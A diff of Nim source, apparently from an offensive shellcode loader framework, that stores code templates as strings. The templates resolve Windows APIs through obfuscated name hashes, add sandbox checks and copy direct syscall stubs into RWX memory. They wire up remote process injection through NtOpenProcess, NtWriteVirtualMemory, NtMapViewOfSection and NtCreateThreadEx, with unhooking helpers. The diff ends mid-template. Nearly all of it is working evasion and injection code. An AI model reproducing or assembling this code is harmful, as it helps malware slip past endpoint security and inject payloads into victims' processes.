@@ -6,49 +6,120 @@ const
 
 type
   #GetCurrentProcess_t* = proc (): DWORD {.stdcall.}
-  #GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
+  GetCurrentProcessId_t* = proc (): DWORD {.stdcall.}
   VirtualAllocEx_t* = proc (hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.}
   OpenProcess_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwProcessId: DWORD): HANDLE {.stdcall.}
   VirtualProtect_t* = proc (lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}
+  GetProcessHeap_t* = proc (): HANDLE {.stdcall.}
+  GetProcAddress_t* = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
+  RtlAddVectoredExceptionHandler_t* = proc (First: ULONG, Handler: PVECTORED_EXCEPTION_HANDLER): PVOID {.stdcall.}
+  GetModuleHandleA_t* = proc (lpModuleName: LPCSTR): HMODULE {.stdcall.}
+  GetThreadContext_t* = proc (hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.stdcall.}
+  SetThreadContext_t* = proc (hThread: HANDLE, lpContext: LPCONTEXT): WINBOOL {.stdcall.}
+  CloseHandle_t* = proc (hObject: HANDLE): WINBOOL {.stdcall.}
+  OpenThread_t* = proc (dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, dwThreadId: DWORD): HANDLE {.stdcall.}
+  GetCurrentThreadId_t* = proc (): DWORD {.stdcall.}
+  WaitForSingleObject_t* = proc (hHandle: HANDLE, dwMilliseconds: DWORD): DWORD {.stdcall.}
+  MultiByteToWideChar_t* = proc (CodePage: UINT, dwFlags: DWORD, lpMultiByteStr: LPCSTR, cbMultiByte: cint, lpWideCharStr: LPWSTR, cchWideChar: cint): cint {.cdecl,stdcall.}
+  Sleep_t* = proc (dwMilliseconds: DWORD): DWORD {.stdcall.}
+when not defined(SkipDefaultSandBoxChecks):
+  type  GetTickCount_t* = proc (): DWORD {.stdcall.}
 
 const
-  #GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
+  GetCurrentProcessId_HASH * = obf("GetCurrentProcessId")
   VirtualAllocEx_HASH * = obf("VirtualAllocEx")
   #GetCurrentProcess_HASH * = obf("GetCurrentProcess")
   OpenProcess_HASH * = obf("OpenProcess")
   VirtualProtect_HASH * = obf("VirtualProtect")
+  GetProcessHeap_HASH * = obf("GetProcessHeap")
+  GetProcAddress_HASH * = obf("GetProcAddress")
+  RtlAddVectoredExceptionHandler_HASH * = obf("RtlAddVectoredExceptionHandler")
+  GetModuleHandleA_HASH * = obf("GetModuleHandleA")
+  GetThreadContext_HASH * = obf("GetThreadContext")
+  SetThreadContext_HASH * = obf("SetThreadContext")
+  CloseHandle_HASH * = obf("CloseHandle")
+  OpenThread_HASH * = obf("OpenThread")
+  GetCurrentThreadId_HASH * = obf("GetCurrentThreadId")
+  WaitForSingleObject_HASH * = obf("WaitForSingleObject")
+  MultiByteToWideChar_HASH * = obf("MultiByteToWideChar")
+  Sleep_HASH * = obf("Sleep")
+when not defined(SkipDefaultSandBoxChecks):
+  const  GetTickCount_HASH * = obf("GetTickCount")
 
 #var MyGetCurrentProcess*: GetCurrentProcess_t
 var MyVirtualAllocEx*: VirtualAllocEx_t
-#var MyGetCurrentProcessId*: GetCurrentProcessId_t
+var MyGetCurrentProcessId*: GetCurrentProcessId_t
 var MyOpenProcess*: OpenProcess_t
 var MyVirtualProtect*: VirtualProtect_t
+var MyGetProcessHeap*: GetProcessHeap_t
+var MyGetProcAddress*: GetProcAddress_t
+var MyRtlAddVectoredExceptionHandler*: RtlAddVectoredExceptionHandler_t
+var MyGetModuleHandleA*: GetModuleHandleA_t
+var MyGetThreadContext*: GetThreadContext_t
+var MySetThreadContext*: SetThreadContext_t
+var MyCloseHandle*: CloseHandle_t
+var MyOpenThread*: OpenThread_t
+var MyGetCurrentThreadId*: GetCurrentThreadId_t
+var MyWaitForSingleObject*: WaitForSingleObject_t
+var MultiByteToWideChar*: MultiByteToWideChar_t
+var MySleep*: Sleep_t
+when not defined(SkipDefaultSandBoxChecks):
+  var MyGetTickCount*: GetTickCount_t
+
 
 #MyGetCurrentProcess = cast[GetCurrentProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcess_HASH, 0, FALSE)))
 
-#MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))
+MyGetCurrentProcessId = cast[GetCurrentProcessId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentProcessId_HASH, 0, FALSE)))
 
 MyVirtualProtect = cast[VirtualProtect_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualProtect_HASH, 0, FALSE))
 
 MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
+
+MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcessHeap_HASH, 0, FALSE)))
+
+MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))
+
+MyRtlAddVectoredExceptionHandler = cast[RtlAddVectoredExceptionHandler_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, TRUE)), RtlAddVectoredExceptionHandler_HASH, 0, TRUE)))
+
+MyGetModuleHandleA = cast[GetModuleHandleA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleHandleA_HASH, 0, FALSE)))
+
+MyGetThreadContext = cast[GetThreadContext_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetThreadContext_HASH, 0, FALSE)))
+
+MySetThreadContext = cast[SetThreadContext_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), SetThreadContext_HASH, 0, FALSE)))
+
+MyCloseHandle = cast[CloseHandle_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CloseHandle_HASH, 0, FALSE)))
+
+MyOpenThread = cast[OpenThread_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenThread_HASH, 0, FALSE)))
+
+MyGetCurrentThreadId = cast[GetCurrentThreadId_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetCurrentThreadId_HASH, 0, FALSE)))
+
+MyWaitForSingleObject = cast[WaitForSingleObject_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), WaitForSingleObject_HASH, 0, FALSE)))
+
+MultiByteToWideChar = cast[MultiByteToWideChar_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), MultiByteToWideChar_HASH, 0, FALSE)))
+
+MySleep = cast[Sleep_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), Sleep_HASH, 0, FALSE)))
+
+when not defined(SkipDefaultSandBoxChecks):
+  MyGetTickCount = cast[GetTickCount_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetTickCount_HASH, 0, FALSE)))
+        
 """
 
 let DInvokeLoadLibraryAGetProcAddress * = """
 
-    type
-      LoadLibraryA_t = proc (lpLibFileName: LPCSTR): HMODULE {.stdcall.}
-      GetProcAddress_t = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
-      
-    const
-      LoadLibraryA_HASH  = obf("LoadLibraryA")
-      GetProcAddress_HASH  = obf("GetProcAddress")
-      
-    var MyLoadLibraryA: LoadLibraryA_t
-    var MyGetProcAddress: GetProcAddress_t
+type
+  LoadLibraryA_t = proc (lpLibFileName: LPCSTR): HMODULE {.stdcall.}
+  #GetProcAddress_t = proc (hModule: HMODULE, lpProcName: LPCSTR): FARPROC {.stdcall.}
+  
+const
+  LoadLibraryA_HASH  = obf("LoadLibraryA")
+  #GetProcAddress_HASH  = obf("GetProcAddress")
+  
+var MyLoadLibraryA: LoadLibraryA_t
+#var MyGetProcAddress: GetProcAddress_t
 
-    MyLoadLibraryA = cast[LoadLibraryA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), LoadLibraryA_HASH, 0, FALSE)))
+MyLoadLibraryA = cast[LoadLibraryA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), LoadLibraryA_HASH, 0, FALSE)))
 
-    MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))
+#MyGetProcAddress = cast[GetProcAddress_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcAddress_HASH, 0, FALSE)))
 
 
 
@@ -79,33 +150,61 @@ when defined(GetSyscallStub):
     
     var 
         SYSCALL_STUB_SIZE: int = 23
+
+    # Unmanaged NTDLL Declarations
+
+    type myNtClose = proc(Handle: HANDLE): NTSTATUS {.stdcall.}
+    var NtClose: proc(Handle: HANDLE): NTSTATUS {.stdcall.}
+
+    type myNtAllocateVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
+
+    var NtAllocateVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
+
+    type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
+
+    var NtCreateThreadEx: myNtCreateThreadEx
+
+    type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
     
+    type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
+    
+    var NtWriteVirtualMemory: proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
+
+    type myNtProtectVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
+
+    var NtProtectVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
+
+    type myNtCreateSection = proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}
+
+    var NtCreateSection: proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}
+
+    type myNtMapViewOfSection = proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
+
+    var NtMapViewOfSection: proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
+
+
     
     type
       CreateFileA_t* = proc (lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
       GetFileSize_t* = proc (hFile: HANDLE, lpFileSizeHigh: LPDWORD): DWORD {.stdcall.}
       RtlAllocateHeap_t* = proc (HeapHandle: PVOID, Flags: ULONG, Size: SIZE_T): PVOID {.stdcall.}
-      GetProcessHeap_t* = proc (): HANDLE {.stdcall.}
       ReadFile_t* = proc (hFile: HANDLE, lpBuffer: LPVOID, nNumberOfBytesToRead: DWORD, lpNumberOfBytesRead: LPDWORD, lpOverlapped: LPOVERLAPPED): WINBOOL {.stdcall.}
       
     const
       CreateFileA_HASH * = obf("CreateFileA")
       GetFileSize_HASH * = obf("GetFileSize")
       RtlAllocateHeap_HASH * = obf("RtlAllocateHeap")
-      GetProcessHeap_HASH * = obf("GetProcessHeap")
       ReadFile_HASH * = obf("ReadFile")
     when defined(DInvoke):  
         var MyCreateFileA*: CreateFileA_t
         var MyGetFileSize*: GetFileSize_t
         var MyRtlAllocateHeap*: RtlAllocateHeap_t
-        var MyGetProcessHeap*: GetProcessHeap_t
         var MyReadFile*: ReadFile_t
     
     when defined(DInvoke):
         MyCreateFileA = cast[CreateFileA_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileA_HASH, 0, FALSE)))
         MyGetFileSize = cast[GetFileSize_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetFileSize_HASH, 0, FALSE)))
         MyRtlAllocateHeap = cast[RtlAllocateHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), RtlAllocateHeap_HASH, 0, TRUE)))
-        MyGetProcessHeap = cast[GetProcessHeap_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetProcessHeap_HASH, 0, FALSE)))
         MyReadFile = cast[ReadFile_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), ReadFile_HASH, 0, FALSE)))
     
     proc RVAtoRawOffset(RVA: DWORD_PTR, section: PIMAGE_SECTION_HEADER): PVOID =
@@ -167,59 +266,8 @@ when defined(GetSyscallStub):
 """
 
 
-# Todo - use theese functions for all modules
+let RetrieveSyscallStubs * = """
 
-let NtProtectVirtualMemoryDelegate * = """
-    # Unmanaged NTDLL Declaration
-    type myNtProtectVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
-
-    var NtProtectVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.stdcall.}
-
-"""
-
-
-let NtWriteVirtualMemoryDelegate * = """
-    # Unmanaged NTDLL Declaration
-    type myNtWriteVirtM = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
-
-    var NtWriteVirtualMemory: proc (ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
-
-"""
-
-
-let NtCloseDelegate * = """
-    # Unmanaged NTDLL Declaration
-    type myNtClose = proc(Handle: HANDLE): NTSTATUS {.stdcall.}
-    var NtClose: proc(Handle: HANDLE): NTSTATUS {.stdcall.}
-
-"""
-
-let NtAllocateVirtualMemoryDelegate * = """
-    # Unmanaged NTDLL Declaration
-    type myNtAllocateVirtM = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
-
-    var NtAllocateVirtualMemory: proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
-
-"""
-
-let NtCreateSectionDelegate * = """
-    # Unmanaged NTDLL Declaration
-    type myNtCreateSection = proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}
-
-    var NtCreateSection: proc(SectionHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, MaximumSize: PLARGE_INTEGER, SectionPageProtection: ULONG, AllocationAttributes: ULONG, FileHandle: HANDLE): NTSTATUS {.stdcall.}
-
-"""
-
-let NtMapViewOfSectionDelegate * = """
-    # Unmanaged NTDLL Declaration
-    type myNtMapViewOfSection = proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
-
-    var NtMapViewOfSection: proc(SectionHandle: HANDLE, ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, CommitSize: SIZE_T, SectionOffset: PLARGE_INTEGER, ViewSize: PSIZE_T, InheritDisposition: ULONG, AllocationType: ULONG, Win32Protect: ULONG): NTSTATUS {.stdcall.}
-
-"""
-
-
-let NtProtectSyscallStart * = """
 
     var hProcess: HANDLE
     when defined(DInvoke):
@@ -235,6 +283,84 @@ let NtProtectSyscallStart * = """
         var pHandle2: HANDLE = -1
         var syscallStub_NtProtect: LPVOID
         syscallStub_NtProtect = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
+
+    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
+    
+    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (2 * cast[HANDLE](SYSCALL_STUB_SIZE))
+    
+    var oldProtection: DWORD = 0
+    
+    # Define NtProtectVirtualMemory
+    NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
+    # define NtWriteVirtualMemory
+    NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
+    # define NtAllocateVirtualMemory
+    NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))    
+    
+    
+    var syssuccess = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
+    when defined(verbose):
+        echo obf("[*] GetSyscallStub NtProtectVirtualMemory: ") & $syssuccess
+    syssuccess = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
+    when defined(verbose):
+        echo obf("[*] GetSyscallStub NtWriteVirtualMemory: ") & $syssuccess
+    syssuccess = GetSyscallStub(obf("NtAllocateVirtualMemory"), cast[LPVOID](syscallStub_NtAlloc))
+    when defined(verbose):
+        echo obf("[*] GetSyscallStub NtAllocateVirtualMemory: ") & $syssuccess
+    
+    var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (7 * cast[HANDLE](SYSCALL_STUB_SIZE))
+    # define NtClose
+    NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
+    syssuccess = GetSyscallStub(obf("NtClose"), cast[LPVOID](syscallStub_NtClose))
+    when defined(verbose):
+        echo obf("[*] GetSyscallStub NtClose: ") & $syssuccess
+
+    when defined(LocalCreateThread):
+        var syscallStub_NtCreateThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (3 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThread))
+        syssuccess = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreateThread))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtCreateThreadEx: ") & $syssuccess
+    
+    when defined(remoteMapSection):
+        var syscallStub_NtCreateSection: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (4 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        var syscallStub_NtMapViewOfSection: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (5 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define NtCreateSection
+        NtCreateSection = cast[myNtCreateSection](cast[LPVOID](syscallStub_NtCreateSection))
+        syssuccess = GetSyscallStub(obf("NtCreateSection"), cast[LPVOID](syscallStub_NtCreateSection))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtCreateSection: ") & $syssuccess
+
+        # define NtMapViewOfSection
+        NtMapViewOfSection = cast[myNtMapViewOfSection](cast[LPVOID](syscallStub_NtMapViewOfSection))
+        syssuccess = GetSyscallStub(obf("NtMapViewOfSection"), cast[LPVOID](syscallStub_NtMapViewOfSection))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtMapViewOfSection: ") & $syssuccess
+
+
+
+    when defined(remoteinject):
+        var syscallStub_NtOpenP: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (6 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define NtOpenProcess
+        var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
+        when defined(DInvoke):
+            MyVirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        else:
+            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
+        
+        syssuccess = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtOpenProcess: ") & $syssuccess
+
+        var syscallStub_NtCreateThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (3 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThread))
+        syssuccess = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreateThread))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtCreateThreadEx: ") & $syssuccess
+
+
+    
+
 """
 
 let DInvokeUnhookStubs * = """
@@ -280,107 +406,7 @@ let DInvokeUnhookStubs * = """
     MyFreeLibrary = cast[FreeLibrary_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), FreeLibrary_HASH, 0, FALSE))
 """
 
-let UnhookSyscalls * = """
-
-
-    proc GetUnhookStubs(): void =
-
-        var success: BOOL
-        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
-        
-        var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
-        
-        var oldProtection: DWORD = 0
-        
-        # Define NtProtectVirtualMemory
-        when defined(DInvoke):
-            NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        else:
-            NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-            success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        
-        # define NtWriteVirtualMemory
-        when defined(DInvoke):
-            NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        else:
-            NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
-            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        # define NtClose
-        when defined(DInvoke):
-            NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
-            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtClose), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        else:
-            NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
-            success = VirtualProtect(cast[LPVOID](syscallStub_NtClose), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        
-        success = GetSyscallStub(obf("NtProtectVirtualMemory"), cast[LPVOID](syscallStub_NtProtect))
-        success = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
-        success = GetSyscallStub(obf("NtClose"), cast[LPVOID](syscallStub_NtClose))
-
-"""
-
-let LocalInjectDelegates * = """
-    # Unmanaged NTDLL Declarations
-    type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
-    type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
-
-"""
-
-let NtCreateThreadExDelegate * = """
-    type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
-
-"""
-
-let RemoteInjectDelegates * = """
-    # Unmanaged NTDLL Declarations
-    type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
-    type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
-    type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
-    type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}
-
-"""
-
 let SyscallStubSizeStub * = """
 var 
     SYSCALL_STUB_SIZE: int = 23
-"""
-
-let ProtectWriteAllocSyscalls * = """
-
-    proc GetStubs(): void =
-
-    
-        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
-        
-        var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
-        
-        var oldProtection: DWORD = 0
-        
-        # Define NtProtectVirtualMemory
-        NtProtectVirtualMemory = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
-        when defined(DInvoke):
-            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
-        else:
